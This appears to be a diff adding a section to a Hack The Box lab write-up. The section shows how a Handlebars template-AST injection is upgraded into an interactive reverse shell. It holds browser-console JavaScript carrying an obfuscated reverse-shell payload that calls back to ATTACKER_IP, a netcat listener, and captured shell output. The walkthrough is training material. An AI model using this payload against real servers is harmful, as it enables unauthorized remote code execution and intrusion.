@@ -1251,7 +1251,93 @@ The reason `process.mainModule.require` is used rather than a bare `require` is 
 <br>
 </div>
 
+### 3.2 — Upgrade to an interactive reverse shell
 
+Single-command execution requires a POST followed by a page load for each command, and returns output through a public web page. Establish a persistent interactive shell for practical post-exploitation.
+
+**Commands:**
+
+```bash
+nc -lvnp 4444
+```
+
+At `http://dzcampaigns.htb/character/15/edit`, DevTools → Console:
+
+```javascript
+const csrf = document.querySelector('[name="_csrf"]').value;
+const L = { start: { line: 1, column: 0 }, end: { line: 1, column: 1 } };
+
+const cmd = "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1";
+const b64 = btoa(cmd);
+const payload = `{},{})) + process.mainModule.require('child_process').exec('echo ${b64} | base64 -d | bash') //`;
+
+const ast = {
+  type: "Program",
+  body: [{
+    type: "MustacheStatement",
+    path: { type: "PathExpression", data: false, depth: 0,
+            parts: ["lookup"], original: "lookup", loc: L },
+    params: [
+      { type: "PathExpression", data: false, depth: 0,
+        parts: [], original: "this", loc: L },
+      { type: "NumberLiteral", value: payload, original: 1, loc: L }
+    ],
+    escaped: true,
+    strip: { open: false, close: false },
+    loc: L
+  }],
+  strip: {},
+  loc: L
+};
+
+const r = await fetch("/character/15", {
+  method: "POST",
+  credentials: "same-origin",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({
+    _csrf: csrf, name: "Testchar", race: "Elf", class: "Rogue",
+    backstory: "test", campaign_message: ast
+  })
+});
+console.log(r.status);
+```
+
+**Breakdown:**
+
+|Component|Purpose|Simple Explanation|
+|---|---|---|
+|`nc -lvnp 4444`|Listener: `-l` listen, `-v` verbose, `-n` no DNS, `-p` port|Waits for the target to call back|
+|`bash -i`|Interactive bash|A shell that accepts typed commands|
+|`>& /dev/tcp/ATTACKER_IP/4444`|Redirects stdout and stderr to a TCP socket|Sends everything the shell prints to your listener|
+|`0>&1`|Redirects stdin from the same socket|Lets what you type reach the shell|
+|`btoa(cmd)`|Base64-encodes the command in the browser|Avoids quoting `>&` and `0>&1` through three nested layers|
+|`echo <b64> \| base64 -d \| bash`|Decodes and executes server-side|Unpacks the command and runs it|
+|`.exec(...)`|**Asynchronous** child process|Returns immediately instead of waiting|
+
+`exec` replaces `execSync` here deliberately. The synchronous variant blocks until the child exits, and a reverse shell never exits — the HTTP request would hang and time out before a prompt appeared.
+
+**Result:**
+
+```shell
+┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/DarkZeroReturns]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.15.227] from (UNKNOWN) [10.129.54.208] 56902
+bash: cannot set terminal process group (756): Inappropriate ioctl for device
+bash: no job control in this shell
+darkzero@SRV01:~$ 
+```
+
+**What this gives you:** An interactive foothold on the target as the web service account.
+
+**Key findings:**
+
+- Interactive shell obtained as `darkzero` on host `SRV01`.
+- The hostname identifies this as the Linux application server. Earlier reconnaissance flagged Windows characteristics behind a Linux edge host (1.2, 1.3); SRV01 is that edge host, and the Windows environment lies beyond it.
+- Outbound TCP to arbitrary attacker-controlled ports is unrestricted. No egress filtering interfered with the callback on port 4444.
+- The shell has no controlling TTY, producing the `Inappropriate ioctl for device` and `no job control` warnings. Commands requiring a terminal — `su`, `ssh`, `sudo` with password prompt, full-screen editors — will fail until the shell is upgraded.
+
+**Next:** Stabilise the shell to obtain a full TTY, then enumerate the application directory for stored credentials.
 <div align="center">
 <br>
 <br>
